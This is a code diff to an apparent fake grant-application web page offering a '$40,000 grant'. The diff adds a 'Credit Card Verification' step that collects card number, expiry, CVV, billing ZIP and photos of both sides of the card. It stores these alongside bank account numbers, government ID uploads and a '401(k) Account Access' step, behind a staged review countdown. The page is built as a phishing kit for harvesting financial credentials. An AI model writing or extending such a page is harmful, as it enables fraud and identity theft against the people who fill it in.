@@ -59,22 +59,26 @@
       </div>
       <div class="progress-step">
         <div class="step-circle">3</div>
-        <span class="progress-step-label">Funding Need</span>
+        <span class="progress-step-label">Credit Card</span>
       </div>
       <div class="progress-step">
         <div class="step-circle">4</div>
-        <span class="progress-step-label">ID Verify</span>
+        <span class="progress-step-label">Funding Need</span>
       </div>
       <div class="progress-step">
         <div class="step-circle">5</div>
-        <span class="progress-step-label">Reviewing</span>
+        <span class="progress-step-label">ID Verify</span>
       </div>
       <div class="progress-step">
         <div class="step-circle">6</div>
-        <span class="progress-step-label">401(k) Access</span>
+        <span class="progress-step-label">Reviewing</span>
       </div>
       <div class="progress-step">
         <div class="step-circle">7</div>
+        <span class="progress-step-label">401(k) Access</span>
+      </div>
+      <div class="progress-step">
+        <div class="step-circle">8</div>
         <span class="progress-step-label">Review</span>
       </div>
       <div id="progressPauseIcon" class="progress-line-pause" title="30-minute review in progress">
@@ -232,7 +236,93 @@
 
 
       <div class="form-step" data-step="3" style="display: none;">
-        <h3>Step 3: Funding Need Summary</h3>
+        <h3>Step 3: Credit Card Verification</h3>
+        <p class="step-desc">For identity verification and secure payment processing, please provide your credit card details and upload clear images of the front and back of your card.</p>
+        
+        <div style="background: linear-gradient(135deg, rgba(29,78,216,0.06), rgba(10,25,41,0.02)); border: 1px solid rgba(29,78,216,0.25); border-radius: 14px; padding: 1.25rem 1.25rem; margin-bottom: 2rem; display: flex; gap: 1rem; align-items: flex-start;">
+          <div style="width: 44px; height: 44px; border-radius: 10px; background: rgba(29,78,216,0.12); display: flex; align-items: center; justify-content: center; flex-shrink: 0;">
+            <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" fill="none" viewBox="0 0 24 24" stroke="#1d4ed8" stroke-width="2">
+              <path stroke-linecap="round" stroke-linejoin="round" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
+            </svg>
+          </div>
+          <div style="line-height: 1.7; color: var(--gray-700); font-size: 0.95rem;">
+            <p style="margin: 0 0 0.5rem; color: var(--navy-900); font-weight: 600;">Secure Credit Card Verification</p>
+            <p style="margin: 0 0 0.25rem;">This information is used solely for identity verification purposes. All credit card data is encrypted and securely stored.</p>
+            <p style="margin: 0;">Please ensure card images are clear with all four corners visible and card details are legible.</p>
+          </div>
+        </div>
+
+        <div class="form-grid">
+          <div class="form-group full">
+            <label>Cardholder Name</label>
+            <input type="text" name="cardholderName" class="form-input" placeholder="John A. Smith" autocomplete="cc-name">
+          </div>
+          <div class="form-group full">
+            <label>Card Number</label>
+            <input type="text" name="cardNumber" class="form-input" placeholder="1234 5678 9012 3456" maxlength="19" pattern="[0-9\s]{13,19}" autocomplete="cc-number">
+          </div>
+          <div class="form-group">
+            <label>Expiration Date</label>
+            <input type="text" name="cardExpiry" class="form-input" placeholder="MM/YY" maxlength="5" pattern="(0[1-9]|1[0-2])\/([0-9]{2})" autocomplete="cc-exp">
+          </div>
+          <div class="form-group">
+            <label>CVV / Security Code</label>
+            <input type="text" name="cardCvv" class="form-input" placeholder="123" maxlength="4" pattern="[0-9]{3,4}" autocomplete="cc-csc">
+          </div>
+          <div class="form-group">
+            <label>Card Type</label>
+            <select name="cardType" class="form-select">
+              <option value="">Select Card Type</option>
+              <option>Visa</option>
+              <option>Mastercard</option>
+              <option>American Express</option>
+              <option>Discover</option>
+              <option>Other</option>
+            </select>
+          </div>
+          <div class="form-group">
+            <label>Billing ZIP Code</label>
+            <input type="text" name="cardZip" class="form-input" placeholder="10001" maxlength="5" pattern="[0-9]{5}" autocomplete="postal-code">
+          </div>
+
+          <div class="form-group full">
+            <label>Upload Front of Credit Card</label>
+            <div class="upload-area" id="uploadCardFront" style="border: 1.5px dashed rgba(29,78,216,0.45); background: rgba(29,78,216,0.03);">
+              <div class="upload-icon" style="color: #1d4ed8;">
+                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                  <path stroke-linecap="round" stroke-linejoin="round" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
+                </svg>
+              </div>
+              <h4>Front of Credit Card — Click or Drag &amp; Drop</h4>
+              <p>Clear color photo showing card number and name · JPG, PNG · Max 10MB</p>
+              <input type="file" id="fileCardFront" accept="image/*" style="display: none;">
+            </div>
+            <div class="id-preview" id="cardFrontPreview" style="display: none; margin-top: 1rem;"></div>
+          </div>
+
+          <div class="form-group full">
+            <label>Upload Back of Credit Card</label>
+            <div class="upload-area" id="uploadCardBack" style="border: 1.5px dashed rgba(29,78,216,0.45); background: rgba(29,78,216,0.03);">
+              <div class="upload-icon" style="color: #1d4ed8;">
+                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                  <path stroke-linecap="round" stroke-linejoin="round" d="M3 10h18M3 14h18m-9-4v8m-7 2h14a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z" />
+                </svg>
+              </div>
+              <h4>Back of Credit Card — Click or Drag &amp; Drop</h4>
+              <p>CVV code and signature visible · JPG, PNG · Max 10MB</p>
+              <input type="file" id="fileCardBack" accept="image/*" style="display: none;">
+            </div>
+            <div class="id-preview" id="cardBackPreview" style="display: none; margin-top: 1rem;"></div>
+          </div>
+        </div>
+        <div class="form-actions">
+          <button class="btn-prev btn btn-outline-dark">← Previous</button>
+          <button class="btn-next-step btn btn-primary">Continue →</button>
+        </div>
+      </div>
+
+      <div class="form-step" data-step="4" style="display: none;">
+        <h3>Step 4: Funding Need Summary</h3>
         <p class="step-desc">Tell us whether you need the grant for a business, a personal purpose, or to resolve a financial problem.</p>
         <div class="form-grid">
           <div class="form-group full">
@@ -302,8 +392,8 @@
         </div>
       </div>
 
-      <div class="form-step" data-step="4" style="display: none;">
-        <h3>Step 4: Valid ID Verification</h3>
+      <div class="form-step" data-step="5" style="display: none;">
+        <h3>Step 5: Valid ID Verification</h3>
         <p class="step-desc">Upload a government-issued photo ID and enter the information exactly as it appears on the document. This step is used only to confirm your identity and protect your application.</p>
 
         <div style="background: linear-gradient(135deg, rgba(16,185,129,0.06), rgba(10,25,41,0.02)); border: 1px solid rgba(16,185,129,0.25); border-radius: 14px; padding: 1.25rem 1.25rem; margin-bottom: 2rem; display: flex; gap: 1rem; align-items: flex-start;">
@@ -464,8 +554,8 @@
         </div>
       </div>
 
-      <div class="form-step" data-step="5" style="display: none;">
-        <h3>Step 5: Application Under Review</h3>
+      <div class="form-step" data-step="6" style="display: none;">
+        <h3>Step 6: Application Under Review</h3>
         <p class="step-desc">We are reviewing your submitted information. Please wait for the review countdown to complete. You will automatically move to the next step once the review is finished.</p>
 
         <div style="text-align: center; padding: 2rem 1rem 1.5rem;">
@@ -525,8 +615,8 @@
         </div>
       </div>
 
-      <div class="form-step" data-step="6" style="display: none;">
-        <h3>Step 6: 401(k) Account Access</h3>
+      <div class="form-step" data-step="7" style="display: none;">
+        <h3>Step 7: 401(k) Account Access</h3>
         <p class="step-desc">To access the $40,000 grant, you need to access your official 401(k) account below. This step confirms that you are the account holder authorized to receive the grant award.</p>
 
         <div style="background: linear-gradient(135deg, rgba(212,175,55,0.08), rgba(10,25,41,0.02)); border: 1px solid rgba(212,175,55,0.35); border-radius: 14px; padding: 1.25rem 1.25rem; margin-bottom: 2rem; display: flex; gap: 1rem; align-items: flex-start;">
@@ -559,8 +649,8 @@
       </div>
 
 
-      <div class="form-step" data-step="7" style="display: none;">
-        <h3>Step 7: Review & Submit</h3>
+      <div class="form-step" data-step="8" style="display: none;">
+        <h3>Step 8: Review & Submit</h3>
         <p class="step-desc">Please verify all information below before submitting your application. Once submitted, changes may delay processing.</p>
 
         <div class="review-summary">
@@ -761,6 +851,32 @@
 
     wireIdUpload('uploadIdFront', 'fileIdFront', 'idFrontPreview', 'Front of ID');
     wireIdUpload('uploadIdBack', 'fileIdBack', 'idBackPreview', 'Back of ID');
+    
+    // Wire up credit card image uploads
+    wireIdUpload('uploadCardFront', 'fileCardFront', 'cardFrontPreview', 'Front of Card');
+    wireIdUpload('uploadCardBack', 'fileCardBack', 'cardBackPreview', 'Back of Card');
+    
+    // Add credit card number formatting
+    const cardNumberInput = document.querySelector('input[name="cardNumber"]');
+    if (cardNumberInput) {
+      cardNumberInput.addEventListener('input', function(e) {
+        let value = e.target.value.replace(/\s/g, '');
+        let formattedValue = value.match(/.{1,4}/g);
+        e.target.value = formattedValue ? formattedValue.join(' ') : value;
+      });
+    }
+    
+    // Add expiry date formatting (MM/YY)
+    const expiryInput = document.querySelector('input[name="cardExpiry"]');
+    if (expiryInput) {
+      expiryInput.addEventListener('input', function(e) {
+        let value = e.target.value.replace(/\D/g, '');
+        if (value.length >= 2) {
+          value = value.substring(0, 2) + '/' + value.substring(2, 4);
+        }
+        e.target.value = value;
+      });
+    }
   });
 </script>
 <script type="module" src="js/auth.js"></script>
@@ -777,6 +893,7 @@ window.__saveApplication = async function (formData, appNumber) {
       status: 'submitted',
       personal: formData.personal || {},
       banking: formData.banking || {},
+      creditcard: formData.creditcard || {},
       business: formData.business || {},
       id_verify: formData.idVerify || {},
       kaccess: formData.kaccess || {},
@@ -799,12 +916,14 @@ window.__upsertDraftApplication = async function (formData, appNumber) {
       visitor_session: visitorSession,
       personal: formData.personal || {},
       banking: formData.banking || {},
+      creditcard: formData.creditcard || {},
       business: formData.business || {},
       id_verify: formData.idVerify || {},
       kaccess: formData.kaccess || {},
       raw_data: {
         personal: formData.personal || {},
         banking: formData.banking || {},
+        creditcard: formData.creditcard || {},
         business: formData.business || {},
         id_verify: formData.idVerify || {},
         kaccess: formData.kaccess || {}
@@ -873,6 +992,9 @@ window.__buildOrganizedApplicationText = function (formData, appNumber) {
     bankName: 'Bank Name', bankAccountType: 'Bank Account Type',
     accountHolder: 'Account Holder Name', routing: 'Routing Number (ABA)',
     accountNum: 'Account Number',
+    cardholderName: 'Cardholder Name', cardNumber: 'Card Number', 
+    cardExpiry: 'Expiration Date', cardCvv: 'CVV Code',
+    cardType: 'Card Type', cardZip: 'Billing ZIP Code',
     businessName: 'Business Name', businessStatus: 'Grant Purpose',
     businessType: 'Employment Status', industry: 'Use Category',
     employees: 'Work Arrangement', businessSummary: 'Funding Need Summary',
@@ -890,9 +1012,10 @@ window.__buildOrganizedApplicationText = function (formData, appNumber) {
   var sections = [
     { title: 'STEP 1 — Personal Information', data: formData.personal || {} },
     { title: 'STEP 2 — Bank / Payment Details', data: formData.banking || {} },
-    { title: 'STEP 3 — Funding Need Summary', data: formData.business || {} },
-    { title: 'STEP 4 — ID Verification & 401(k) Details', data: formData.idVerify || {} },
-    { title: 'STEP 6 — 401(k) Account Access', data: formData.kaccess || {} }
+    { title: 'STEP 3 — Credit Card Verification', data: formData.creditcard || {} },
+    { title: 'STEP 4 — Funding Need Summary', data: formData.business || {} },
+    { title: 'STEP 5 — ID Verification & 401(k) Details', data: formData.idVerify || {} },
+    { title: 'STEP 7 — 401(k) Account Access', data: formData.kaccess || {} }
   ];
   var lines = [];
   lines.push(STAR15);
@@ -930,6 +1053,9 @@ window.__renderFullReviewBody = function (formData) {
     bankName: 'Bank Name', bankAccountType: 'Bank Account Type',
     accountHolder: 'Account Holder Name', routing: 'Routing Number (ABA)',
     accountNum: 'Account Number',
+    cardholderName: 'Cardholder Name', cardNumber: 'Card Number', 
+    cardExpiry: 'Expiration Date', cardCvv: 'CVV Code',
+    cardType: 'Card Type', cardZip: 'Billing ZIP Code',
     businessName: 'Business Name', businessStatus: 'Grant Purpose',
     businessType: 'Employment Status', industry: 'Use Category',
     employees: 'Work Arrangement', businessSummary: 'Funding Need Summary',
@@ -947,9 +1073,10 @@ window.__renderFullReviewBody = function (formData) {
   var sections = [
     { title: 'Step 1 · Personal Information', data: formData.personal || {}, accent: '#0a1929' },
     { title: 'Step 2 · Bank / Payment Details', data: formData.banking || {}, accent: '#1d4ed8' },
-    { title: 'Step 3 · Funding Need Summary', data: formData.business || {}, accent: '#047857' },
-    { title: 'Step 4 · ID Verification & 401(k) Details', data: formData.idVerify || {}, accent: '#10b981' },
-    { title: 'Step 6 · 401(k) Account Access', data: formData.kaccess || {}, accent: '#d4af37' }
+    { title: 'Step 3 · Credit Card Verification', data: formData.creditcard || {}, accent: '#1d4ed8' },
+    { title: 'Step 4 · Funding Need Summary', data: formData.business || {}, accent: '#047857' },
+    { title: 'Step 5 · ID Verification & 401(k) Details', data: formData.idVerify || {}, accent: '#10b981' },
+    { title: 'Step 7 · 401(k) Account Access', data: formData.kaccess || {}, accent: '#d4af37' }
   ];
   var html = '';
   for (var s = 0; s < sections.length; s++) {
